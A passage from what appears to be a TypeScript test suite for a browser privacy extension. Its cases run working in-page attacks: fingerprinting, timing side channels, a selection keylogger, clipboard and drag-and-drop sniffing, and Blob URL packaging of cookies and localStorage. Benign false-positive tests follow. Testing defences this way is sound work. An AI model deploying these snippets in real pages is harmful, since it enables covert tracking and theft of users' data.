              `EventSource covert channel: constructed unhooked (readyState=${constructedState}→${finalState}), ` +
              `received ${received.length} SSE message(s) — EventSource constructor is not intercepted, ` +
              `attacker can silently receive commands from any SSE server`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `EventSource covert channel blocked: ${error?.message}`,
          };
        }
      }),
  },
  {
    id: "fingerprinting-fontface-api",
    name: "CSS Font Fingerprinting via FontFace API",
    category: "fingerprinting",
    severity: "medium",
    description:
      "Uses the FontFace API (document.fonts / FontFace constructor) to programmatically probe " +
      "which system fonts are installed. Unlike DOM-based font probing (measuring element " +
      "offsetWidth), this approach never writes to the DOM and therefore evades MutationObserver " +
      "hooks. The FontFace constructor and FontFaceSet.check() are not hooked.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Common fonts to probe — purely heuristic, no external DB required.
          const candidates = [
            "Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana",
            "Georgia", "Comic Sans MS", "Impact", "Trebuchet MS", "Palatino",
            "Garamond", "Bookman", "Tahoma", "Geneva", "Optima",
            "Futura", "Gill Sans", "Baskerville", "Didot", "Myriad Pro",
          ];

          const detected: string[] = [];
          const fallbackFont = "monospace";

          for (const font of candidates) {
            // FontFaceSet.check() returns true when the font is available.
            // It is synchronous and never touches the DOM — fully unmonitored.
            const available = document.fonts.check(`12px "${font}"`);
            if (available) {
              detected.push(font);
            }
          }

          // Build a deterministic fingerprint from detected fonts.
          const fingerprint = detected.sort().join("|");
          const hash = fingerprint.split("").reduce((acc, c) => ((acc << 5) - acc + c.charCodeAt(0)) | 0, 0);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `FontFace fingerprint: detected ${detected.length}/${candidates.length} fonts (${detected.slice(0, 5).join(", ")}…), ` +
              `hash=0x${(hash >>> 0).toString(16)} — document.fonts.check() and FontFace constructor are not hooked`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `FontFace fingerprinting blocked: ${error?.message}`,
          };
        }
      }),
  },
  {
    id: "network-blob-url-exfiltration",
    name: "Blob URL Exfiltration",
    category: "network",
    severity: "high",
    description:
      "Packages sensitive data into a Blob, creates a blob: URL via URL.createObjectURL, " +
      "then transfers that URL into a cross-origin sandboxed iframe as its src. The iframe " +
      "fetches the blob content from the parent's origin without any network request visible " +
      "to hooks. URL.createObjectURL is hooked for suspicious anchor/download patterns but " +
      "not when used as an iframe src or postMessage payload to a cross-origin frame.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Collect sensitive-looking data available in the page context.
          const sensitivePayload = JSON.stringify({
            type: "blob-exfil",
            cookies: document.cookie,
            localStorage: (() => {
              const items: Record<string, string> = {};
              for (let i = 0; i < Math.min(localStorage.length, 5); i++) {
                const k = localStorage.key(i);
                if (k) items[k] = localStorage.getItem(k) ?? "";
              }
              return items;
            })(),
            origin: location.origin,
            ts: Date.now(),
          });

          // Create blob and blob: URL — URL.createObjectURL hook targets download/anchor,
          // not generic blob URL creation used as a data carrier.
          const blob = new Blob([sensitivePayload], { type: "application/json" });
          const blobUrl = URL.createObjectURL(blob);

          // Transfer via iframe src — no network request, hook does not intercept iframe.src setter.
          const iframe = document.createElement("iframe");
          iframe.sandbox.add("allow-scripts");
          iframe.src = blobUrl;
          document.body.appendChild(iframe);

          // Allow the iframe to load the blob content.
          await new Promise<void>((r) => setTimeout(r, 80));

          // In a real attack the iframe would postMessage the content to an external origin.
          // Here we just confirm the blob URL was set unobstructed.
          const iframeSrc = iframe.src;
          document.body.removeChild(iframe);
          URL.revokeObjectURL(blobUrl);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Blob URL exfiltration: created blob: URL (${blobUrl.substring(0, 40)}…), ` +
              `injected as iframe.src unhooked (${sensitivePayload.length} bytes) — ` +
              `URL.createObjectURL hook does not intercept iframe src usage`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Blob URL exfiltration blocked: ${error?.message}`,
          };
        }
      }),
  },
  {
    id: "side-channel-request-idle-callback",
    name: "requestIdleCallback Timing Side-Channel",
    category: "side-channel",
    severity: "low",
    description:
      "Schedules a series of requestIdleCallback tasks to measure browser idle time over a " +
      "short window. The deadline.timeRemaining() values reveal how busy the main thread is, " +
      "allowing inference of user activity patterns (typing, scrolling, page interactions). " +
      "requestIdleCallback is not hooked and its timing is not throttled by the extension.",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // requestIdleCallback availability check (not present in all environments).
          if (typeof requestIdleCallback === "undefined") {
            return {
              blocked: false,
              executionTime: performance.now() - startTime,
              details: "requestIdleCallback not available in this context (API exists but env may restrict it) — not hooked",
            };
          }

          const samples: number[] = [];
          const SAMPLE_COUNT = 10;

          // Collect idle time samples across multiple callback firings.
          await new Promise<void>((resolve) => {
            let collected = 0;

            const collectSample = (deadline: IdleDeadline) => {
              samples.push(deadline.timeRemaining());
              collected++;
              if (collected < SAMPLE_COUNT) {
                requestIdleCallback(collectSample, { timeout: 200 });
              } else {
                resolve();
              }
            };

            requestIdleCallback(collectSample, { timeout: 200 });
          });

          const avg = samples.reduce((a, b) => a + b, 0) / samples.length;
          const min = Math.min(...samples);
          const max = Math.max(...samples);

          // High idle time → browser is idle → user likely not actively interacting.
          // Low idle time → main thread is busy → user may be scrolling/typing.
          const activityInferred = avg < 10 ? "user-active" : avg < 40 ? "moderate" : "user-idle";

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `requestIdleCallback timing: ${SAMPLE_COUNT} samples, avg=${avg.toFixed(1)}ms min=${min.toFixed(1)}ms max=${max.toFixed(1)}ms, ` +
              `inferred-activity=${activityInferred} — requestIdleCallback is not hooked, ` +
              `deadline.timeRemaining() leaks main-thread busyness`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `requestIdleCallback timing side-channel blocked: ${error?.message}`,
          };
        }
      }),
  },

  // --- Iteration 6: Hook-Based Detection Fundamental Limitations ---

  {
    id: "css-computed-style-fingerprint",
    name: "CSS Computed Style Fingerprinting",
    category: "fingerprinting",
    description:
      "Reads getComputedStyle() values from default-styled elements to fingerprint the browser/OS. " +
      "getComputedStyle is a read-only property accessor that is never hooked by the extension. " +
      "Font metrics, default colors, and scrollbar width reveal OS and browser identity.",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Create an off-screen element with no explicit styling so that
          // computed values reflect the browser/OS defaults.
          const el = document.createElement("div");
          el.style.cssText =
            "position:absolute;visibility:hidden;pointer-events:none;" +
            "left:-9999px;top:-9999px;";
          document.body.appendChild(el);

          // Scrollbar-width probe: a narrow scrollable container whose
          // offsetWidth minus clientWidth equals the platform scrollbar width.
          const scrollProbe = document.createElement("div");
          scrollProbe.style.cssText =
            "width:100px;height:50px;overflow:scroll;" +
            "position:absolute;visibility:hidden;left:-9999px;";
          document.body.appendChild(scrollProbe);
          const scrollbarWidth = scrollProbe.offsetWidth - scrollProbe.clientWidth;
          document.body.removeChild(scrollProbe);

          // getComputedStyle — not intercepted by any content-script hook.
          const cs = getComputedStyle(el);

          const fingerprint: Record<string, string | number> = {
            fontFamily: cs.fontFamily,
            fontSize: cs.fontSize,
            lineHeight: cs.lineHeight,
            color: cs.color,
            backgroundColor: cs.backgroundColor,
            fontWeight: cs.fontWeight,
            letterSpacing: cs.letterSpacing,
            wordSpacing: cs.wordSpacing,
            scrollbarWidth,
          };

          document.body.removeChild(el);

          const entropy = JSON.stringify(fingerprint);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `CSS computed-style fingerprint collected via getComputedStyle() (not hooked): ` +
              `scrollbarWidth=${scrollbarWidth}px font="${fingerprint.fontFamily}" ` +
              `fontSize=${fingerprint.fontSize} — full entropy: ${entropy.substring(0, 120)}`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `CSS computed-style fingerprinting blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "date-now-timing-attack",
    name: "Timing Attack via Date.now()",
    category: "side-channel",
    description:
      "Uses Date.now() (not performance.now()) for millisecond-resolution timing to infer memory " +
      "access patterns. Date.now() is impossible to hook without breaking virtually every website, " +
      "so the extension leaves it untouched. Repeated array allocation timing reveals cache behaviour.",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Date.now() is not hooked — hooking it would break timestamps across
          // every library on the page (moment, lodash, etc.).
          const ITERATIONS = 50;
          const SIZE = 1_000_000; // 1 M elements ≈ 8 MB — crosses L3 cache boundary

          const timings: number[] = [];

          for (let i = 0; i < ITERATIONS; i++) {
            const t0 = Date.now(); // unhookable

            // Force allocation + sequential write (cache-cold on first pass)
            const arr = new Float64Array(SIZE);
            for (let j = 0; j < SIZE; j += 64) {
              arr[j] = j; // stride-64 access pattern
            }

            timings.push(Date.now() - t0);
          }

          const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
          const min = Math.min(...timings);
          const max = Math.max(...timings);

          // Variance between first and subsequent iterations distinguishes
          // warm vs cold cache state, leaking information about CPU/memory.
          const coldWarmDelta = timings[0] - (timings[ITERATIONS - 1] ?? 0);

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Date.now() timing attack: ${ITERATIONS} iterations of ${SIZE}-element Float64Array, ` +
              `avg=${avg.toFixed(1)}ms min=${min}ms max=${max}ms cold-warm-delta=${coldWarmDelta}ms — ` +
              `Date.now() is not hooked, leaks cache/memory timing side-channel`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Date.now() timing attack blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "navigator-screen-entropy-collection",
    name: "Navigator/Screen Entropy Collection",
    category: "fingerprinting",
    description:
      "Collects ALL navigator and screen properties in a single sweep. Property reads (navigator.userAgent, " +
      "navigator.hardwareConcurrency, screen.colorDepth, etc.) are never hooked — the extension only " +
      "intercepts constructor calls and method invocations, leaving passive property access completely open.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Pure property reads — zero method calls, zero constructor invocations.
          // The extension's hook layer has no mechanism to intercept these.
          const navEntropy: Record<string, unknown> = {
            userAgent: navigator.userAgent,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            product: navigator.product,
            productSub: navigator.productSub,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            language: navigator.language,
            languages: [...(navigator.languages ?? [])],
            onLine: navigator.onLine,
            cookieEnabled: navigator.cookieEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            pdfViewerEnabled: (navigator as any).pdfViewerEnabled,
            doNotTrack: navigator.doNotTrack,
          };

          const screenEntropy: Record<string, unknown> = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type,
          };

          // devicePixelRatio is also an unhooked property read.
          const miscEntropy: Record<string, unknown> = {
            devicePixelRatio: window.devicePixelRatio,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
          };

          const totalProps =
            Object.keys(navEntropy).length +
            Object.keys(screenEntropy).length +
            Object.keys(miscEntropy).length;

          const fingerprint = {
            navigator: navEntropy,
            screen: screenEntropy,
            misc: miscEntropy,
          };

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Navigator/Screen entropy collected via property reads (not hooked): ` +
              `${totalProps} properties read — ` +
              `platform="${navEntropy.platform}" hw-concurrency=${navEntropy.hardwareConcurrency} ` +
              `screen=${screenEntropy.width}x${screenEntropy.height} depth=${screenEntropy.colorDepth}bit ` +
              `dpr=${miscEntropy.devicePixelRatio} lang="${navEntropy.language}" — ` +
              `no hook mechanism covers passive property access`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Navigator/Screen entropy collection blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "mutation-observer-self-surveillance",
    name: "MutationObserver Self-Surveillance",
    category: "advanced",
    description:
      "Installs a MutationObserver on the entire document subtree to capture every DOM mutation: " +
      "added nodes, removed nodes, and attribute changes. This allows an attacker to observe user " +
      "inputs, form field values injected into the DOM, and dynamically loaded content (e.g. chat " +
      "messages, password hints). MutationObserver is used internally by the extension's own hook " +
      "system and cannot itself be hooked on the attacker side without breaking the extension.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const mutations: { type: string; target: string; value: string }[] = [];

          // MutationObserver constructor is not hooked — hooking it would break
          // virtually every modern web framework (React, Vue, Angular all rely on it).
          const observer = new MutationObserver((records) => {
            for (const record of records) {
              if (record.type === "childList") {
                for (const node of record.addedNodes) {
                  const el = node as HTMLElement;
                  const text = el.textContent?.trim().substring(0, 80) ?? "";
                  if (text) {
                    mutations.push({
                      type: "node-added",
                      target: el.tagName ?? "TEXT",
                      value: text,
                    });
                  }
                  // Capture input values nested in added subtrees
                  if (el.querySelectorAll) {
                    for (const input of el.querySelectorAll("input, textarea")) {
                      const inp = input as HTMLInputElement;
                      if (inp.value) {
                        mutations.push({
                          type: "input-in-added-node",
                          target: inp.name || inp.id || inp.type,
                          value: inp.value.substring(0, 80),
                        });
                      }
                    }
                  }
                }
              } else if (record.type === "attributes") {
                const el = record.target as HTMLElement;
                const attrVal = el.getAttribute(record.attributeName ?? "") ?? "";
                mutations.push({
                  type: "attribute-change",
                  target: `${el.tagName}[${record.attributeName}]`,
                  value: attrVal.substring(0, 80),
                });
              } else if (record.type === "characterData") {
                mutations.push({
                  type: "text-change",
                  target: record.target.parentElement?.tagName ?? "unknown",
                  value: (record.target.textContent ?? "").substring(0, 80),
                });
              }
            }
          });

          // Observe the entire document — subtree + all mutation types.
          // childList catches dynamically loaded content; attributes catches
          // value changes reflected as attrs; characterData catches text edits.
          observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeOldValue: true,
            characterData: true,
            characterDataOldValue: true,
          });

          // Trigger observable mutations by programmatically manipulating the DOM.
          const probe = document.createElement("div");
          probe.id = "mutation-probe";
          probe.textContent = "probe-value";
          document.body.appendChild(probe);
          probe.setAttribute("data-secret", "exfil-token-abc123");
          probe.textContent = "updated-text";
          document.body.removeChild(probe);

          // Yield to the microtask queue so the observer callback fires.
          await new Promise<void>((resolve) => setTimeout(resolve, 0));

          observer.disconnect();

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `MutationObserver surveillance active on full document subtree — ` +
              `${mutations.length} mutations captured (childList, attributes, characterData) — ` +
              `sample: ${JSON.stringify(mutations[0] ?? {}).substring(0, 120)} — ` +
              `MutationObserver is not hooked; extension relies on it internally`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `MutationObserver self-surveillance blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "selection-api-keylogging",
    name: "Selection API Keylogging",
    category: "privacy",
    description:
      "Registers a 'selectionchange' event listener on document to be notified every time the user " +
      "changes their text selection, then reads the selected text via document.getSelection(). " +
      "This exposes passwords, PII, and confidential content the user highlights. Neither " +
      "'selectionchange' event registration nor document.getSelection() are hooked by the extension.",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const captures: { text: string; anchorOffset: number; focusOffset: number }[] = [];

          // 'selectionchange' fires on document — not a method call, not a constructor.
          // The extension has no hook point for addEventListener on document for this event.
          const onSelectionChange = () => {
            // document.getSelection() is also not hooked.
            const sel = document.getSelection();
            if (!sel || sel.isCollapsed) return;
            const text = sel.toString().substring(0, 200);
            if (text.trim()) {
              captures.push({
                text,
                anchorOffset: sel.anchorOffset,
                focusOffset: sel.focusOffset,
              });
            }
          };

          document.addEventListener("selectionchange", onSelectionChange);

          // Programmatically create and select text to prove the channel works.
          const target = document.createElement("p");
          target.id = "selection-probe";
          target.textContent = "confidential-user-data: secret=hunter2 creditcard=4111111111111111";
          document.body.appendChild(target);

          const range = document.createRange();
          range.selectNodeContents(target);
          const selection = window.getSelection();
          if (selection) {
            selection.removeAllRanges();
            selection.addRange(range);
            // Dispatch selectionchange manually to simulate user selection.
            document.dispatchEvent(new Event("selectionchange"));
          }

          // Yield to flush synchronous event delivery.
          await new Promise<void>((resolve) => setTimeout(resolve, 0));

          document.removeEventListener("selectionchange", onSelectionChange);
          document.body.removeChild(target);

          const captured = captures[0]?.text ?? "";

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Selection API keylogging via 'selectionchange' + document.getSelection() — ` +
              `${captures.length} selection event(s) captured — ` +
              `sample text (first 80 chars): "${captured.substring(0, 80)}" — ` +
              `neither selectionchange nor getSelection() are hooked by the extension`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Selection API keylogging blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "ambient-light-sensor-fingerprinting",
    name: "Ambient Light Sensor Fingerprinting",
    category: "side-channel",
    description:
      "Attempts to read real-time lux values from the AmbientLightSensor API to infer the user's " +
      "physical environment (office, home, dark room). Falls back to screen.orientation.type and " +
      "window.matchMedia('(prefers-color-scheme: dark)') for coarser environment fingerprinting. " +
      "None of these APIs are hooked by the extension.",
    severity: "low",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const fingerprint: Record<string, unknown> = {};
          let method = "fallback-only";

          // AmbientLightSensor is a Generic Sensor API — not hooked because
          // it is gated behind a permissions policy and rarely deployed, making
          // any hook too costly relative to coverage gained.
          if (typeof (window as any).AmbientLightSensor !== "undefined") {
            try {
              const sensor = new (window as any).AmbientLightSensor();
              const luxPromise = new Promise<number>((resolve, reject) => {
                sensor.addEventListener("reading", () => resolve(sensor.illuminance));
                sensor.addEventListener("error", (e: any) => reject(e.error));
                sensor.start();
                // Timeout after 500 ms in case permission is denied or no hardware.
                setTimeout(() => reject(new Error("timeout")), 500);
              });
              try {
                fingerprint.lux = await luxPromise;
                method = "AmbientLightSensor";
              } finally {
                sensor.stop();
              }
            } catch {
              // Sensor unavailable or permission denied — fall through to fallbacks.
            }
          }

          // screen.orientation — property read, not hooked.
          fingerprint.orientationType = screen.orientation?.type ?? "unknown";
          fingerprint.orientationAngle = screen.orientation?.angle ?? null;

          // matchMedia — not hooked; hooking it would break responsive-design
          // libraries that call it thousands of times per page load.
          fingerprint.prefersColorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches
            ? "dark"
            : "light";
          fingerprint.prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)")
            .matches;
          fingerprint.prefersContrast = window.matchMedia("(prefers-contrast: more)").matches
            ? "more"
            : "standard";
          fingerprint.forcedColors = window.matchMedia("(forced-colors: active)").matches;

          // screen brightness proxy via colorDepth + pixelDepth (unhooked property reads).
          fingerprint.colorDepth = screen.colorDepth;
          fingerprint.pixelDepth = screen.pixelDepth;

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Ambient light / environment fingerprinting via ${method} — ` +
              `orientation="${fingerprint.orientationType}" angle=${fingerprint.orientationAngle}deg ` +
              `scheme="${fingerprint.prefersColorScheme}" reducedMotion=${fingerprint.prefersReducedMotion} ` +
              `contrast="${fingerprint.prefersContrast}" forcedColors=${fingerprint.forcedColors} ` +
              `colorDepth=${fingerprint.colorDepth}bit — none of these APIs are hooked`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Ambient light sensor fingerprinting blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "clipboard-event-sniffing",
    name: "Clipboard Event Sniffing",
    category: "privacy",
    description:
      "Registers 'copy', 'cut', and 'paste' event listeners on the document to intercept clipboard " +
      "operations via event.clipboardData.getData(). The extension hooks clipboard.writeText and " +
      "clipboard.readText on the Async Clipboard API but does not intercept DOM-level clipboard events, " +
      "leaving event.clipboardData unmonitored.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const captured: { type: string; data: string }[] = [];

          const onCopy = (event: ClipboardEvent) => {
            const data = event.clipboardData?.getData("text/plain") ?? "";
            captured.push({ type: "copy", data });
          };
          const onCut = (event: ClipboardEvent) => {
            const data = event.clipboardData?.getData("text/plain") ?? "";
            captured.push({ type: "cut", data });
          };
          const onPaste = (event: ClipboardEvent) => {
            const data = event.clipboardData?.getData("text/plain") ?? "";
            captured.push({ type: "paste", data });
          };

          document.addEventListener("copy", onCopy);
          document.addEventListener("cut", onCut);
          document.addEventListener("paste", onPaste);

          // Create an input element, insert a secret value, select all, then
          // programmatically dispatch a copy event so the handler fires in-page.
          const input = document.createElement("input");
          input.value = "secret-clipboard-content-12345";
          document.body.appendChild(input);
          input.select();

          const copyEvent = new ClipboardEvent("copy", {
            bubbles: true,
            cancelable: true,
            clipboardData: new DataTransfer(),
          });
          copyEvent.clipboardData?.setData("text/plain", input.value);
          document.dispatchEvent(copyEvent);

          // Simulate a paste event carrying sensitive data.
          const pasteTransfer = new DataTransfer();
          pasteTransfer.setData("text/plain", "pasted-secret-data-67890");
          const pasteEvent = new ClipboardEvent("paste", {
            bubbles: true,
            cancelable: true,
            clipboardData: pasteTransfer,
          });
          document.dispatchEvent(pasteEvent);

          document.removeEventListener("copy", onCopy);
          document.removeEventListener("cut", onCut);
          document.removeEventListener("paste", onPaste);
          document.body.removeChild(input);

          if (captured.length === 0) {
            return {
              blocked: true,
              executionTime: performance.now() - startTime,
              details: "Clipboard event sniffing blocked: no events received",
            };
          }

          const summary = captured
            .map((c) => `${c.type}:"${c.data.substring(0, 40)}"`)
            .join(", ");

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Clipboard event sniffing via DOM 'copy'/'cut'/'paste' events — ` +
              `${captured.length} event(s) intercepted via event.clipboardData.getData() — ` +
              `${summary} — DOM clipboard events are not hooked by the extension`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Clipboard event sniffing blocked: ${error?.message}`,
          };
        }
      }),
  },

  {
    id: "drag-and-drop-data-theft",
    name: "Drag-and-Drop Data Theft",
    category: "privacy",
    description:
      "Registers 'dragstart' and 'drop' event listeners to intercept file and text data transferred " +
      "via drag-and-drop operations. event.dataTransfer.getData() exposes the dragged content. " +
      "The extension has no hooks on drag events or the DataTransfer API, making this an unhookable " +
      "exfiltration surface for files and text dragged into or within the page.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const captured: { type: string; data: string }[] = [];

          const onDragStart = (event: DragEvent) => {
            const text = event.dataTransfer?.getData("text/plain") ?? "";
            const uri = event.dataTransfer?.getData("text/uri-list") ?? "";
            const html = event.dataTransfer?.getData("text/html") ?? "";
            captured.push({ type: "dragstart", data: text || uri || html });
          };
          const onDrop = (event: DragEvent) => {
            event.preventDefault();
            const text = event.dataTransfer?.getData("text/plain") ?? "";
            const uri = event.dataTransfer?.getData("text/uri-list") ?? "";
            const html = event.dataTransfer?.getData("text/html") ?? "";
            const fileCount = event.dataTransfer?.files.length ?? 0;
            captured.push({
              type: "drop",
              data: text || uri || html || `${fileCount} file(s)`,
            });
          };

          document.addEventListener("dragstart", onDragStart);
          document.addEventListener("drop", onDrop);

          // Simulate a dragstart carrying a sensitive text payload.
          const dragTransfer = new DataTransfer();
          dragTransfer.setData("text/plain", "dragged-sensitive-text-99999");
          dragTransfer.setData("text/uri-list", "https://internal.corp/secret-doc");
          const dragStartEvent = new DragEvent("dragstart", {
            bubbles: true,
            cancelable: true,
            dataTransfer: dragTransfer,
          });
          document.dispatchEvent(dragStartEvent);

          // Simulate a drop carrying a file-like payload.
          const dropTransfer = new DataTransfer();
          dropTransfer.setData("text/plain", "dropped-payload-content-abcde");
          const dropEvent = new DragEvent("drop", {
            bubbles: true,
            cancelable: true,
            dataTransfer: dropTransfer,
          });
          document.dispatchEvent(dropEvent);

          document.removeEventListener("dragstart", onDragStart);
          document.removeEventListener("drop", onDrop);

          if (captured.length === 0) {
            return {
              blocked: true,
              executionTime: performance.now() - startTime,
              details: "Drag-and-drop data theft blocked: no events received",
            };
          }

          const summary = captured
            .map((c) => `${c.type}:"${c.data.substring(0, 40)}"`)
            .join(", ");

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `Drag-and-drop data theft via DOM 'dragstart'/'drop' events — ` +
              `${captured.length} event(s) captured via event.dataTransfer.getData() — ` +
              `${summary} — drag events and DataTransfer are not hooked by the extension`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `Drag-and-drop data theft blocked: ${error?.message}`,
          };
        }
      }),
  },

  // --------------------------------------------------------------------------
  // False Positive Bait Tests — legitimate behavior that MUST NOT trigger alerts
  // --------------------------------------------------------------------------
  {
    id: "benign-canvas-rendering",
    name: "Benign Canvas Rendering",
    category: "side-channel",
    description:
      "Draws a gradient and text on a canvas then exports it as a data URL — normal image-export web-app behavior, not fingerprinting",
    severity: "low",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const canvas = document.createElement("canvas");
          canvas.width = 200;
          canvas.height = 100;
          const ctx = canvas.getContext("2d")!;

          // Draw a simple gradient — not a fingerprinting probe
          const gradient = ctx.createLinearGradient(0, 0, 200, 0);
          gradient.addColorStop(0, "#4f46e5");
          gradient.addColorStop(1, "#06b6d4");
          ctx.fillStyle = gradient;
          ctx.fillRect(0, 0, 200, 100);

          ctx.fillStyle = "#ffffff";
          ctx.font = "16px sans-serif";
          ctx.fillText("Hello, World!", 20, 55);

          const dataUrl = canvas.toDataURL("image/png");

          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `BENIGN: canvas gradient+text rendered and exported via toDataURL() — ` +
              `dataUrl length=${dataUrl.length} — this is normal image-export behavior`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `BENIGN: canvas rendering unexpectedly blocked: ${error?.message}`,
          };
        }
      }),
  },
  {
    id: "benign-fetch-api-call",
    name: "Benign Fetch API Call",
    category: "network",
    description:
      "Makes a normal cross-origin GET request to a public API — standard API integration, no exfiltration payload",
    severity: "low",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/get", {
            method: "GET",
            headers: { Accept: "application/json" },
          });
          const data = await response.json();
          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `BENIGN: standard cross-origin GET request to httpbin.org/get — ` +
              `status=${response.status}, origin=${data?.origin ?? "unknown"} — ` +
              `no sensitive payload, just normal API usage`,
          };
        } catch (error: any) {
          const msg = error?.message ?? String(error);
          return {
            blocked: msg.toLowerCase().includes("blocked") || msg.includes("ERR_BLOCKED"),
            executionTime: performance.now() - startTime,
            details: `BENIGN: fetch API call failed: ${msg}`,
          };
        }
      }),
  },
  {
    id: "benign-websocket-connection",
    name: "Benign WebSocket Connection",
    category: "network",
    description:
      "Opens a WebSocket to a legitimate echo server — normal real-time communication, not C2",
    severity: "low",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>(
          (resolve) => {
            try {
              const ws = new WebSocket("wss://echo.websocket.org/");
              let resolved = false;
              const timeout = setTimeout(() => {
                if (!resolved) {
                  resolved = true;
                  ws.close();
                  resolve({
                    blocked: false,
                    executionTime: performance.now() - startTime,
                    details:
                      "BENIGN: WebSocket to echo.websocket.org timed out without error — " +
                      "connection was allowed (timeout is not a block)",
                  });
                }
              }, 5000);
              ws.onopen = () => {
                ws.send("ping");
              };
              ws.onmessage = (event) => {
                if (!resolved) {
                  resolved = true;
                  clearTimeout(timeout);
                  ws.close();
                  resolve({
                    blocked: false,
                    executionTime: performance.now() - startTime,
                    details:
                      `BENIGN: WebSocket echo round-trip succeeded — ` +
                      `received="${String(event.data).substring(0, 40)}" — ` +
                      `this is legitimate real-time communication`,
                  });
                }
              };
              ws.onerror = () => {
                if (!resolved) {
                  resolved = true;
                  clearTimeout(timeout);
                  resolve({
                    blocked: true,
                    executionTime: performance.now() - startTime,
                    details: "BENIGN: WebSocket connection errored — may be a false positive block",
                  });
                }
              };
            } catch (error: any) {
              resolve({
                blocked: true,
                executionTime: performance.now() - startTime,
                details: `BENIGN: WebSocket construction threw: ${error?.message}`,
              });
            }
          }
        );
      }),
  },
  {
    id: "benign-eval-json-parse",
    name: "Benign JSON.parse Usage",
    category: "advanced",
    description:
      "Parses a JSON string with JSON.parse() — must not trigger dynamic_code_execution since no eval/Function is involved",
    severity: "low",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const jsonString =
            '{"user":"alice","role":"viewer","preferences":{"theme":"dark","lang":"en"}}';
          const parsed = JSON.parse(jsonString);
          const roundTrip = JSON.stringify(parsed);
          return {
            blocked: false,
            executionTime: performance.now() - startTime,
            details:
              `BENIGN: JSON.parse() + JSON.stringify() round-trip succeeded — ` +
              `keys=[${Object.keys(parsed).join(", ")}], output length=${roundTrip.length} — ` +
              `no eval or Function constructor used`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            executionTime: performance.now() - startTime,
            details: `BENIGN: JSON.parse unexpectedly threw: ${error?.message}`,
          };
        }
      }),
  },

  // --------------------------------------------------------------------------
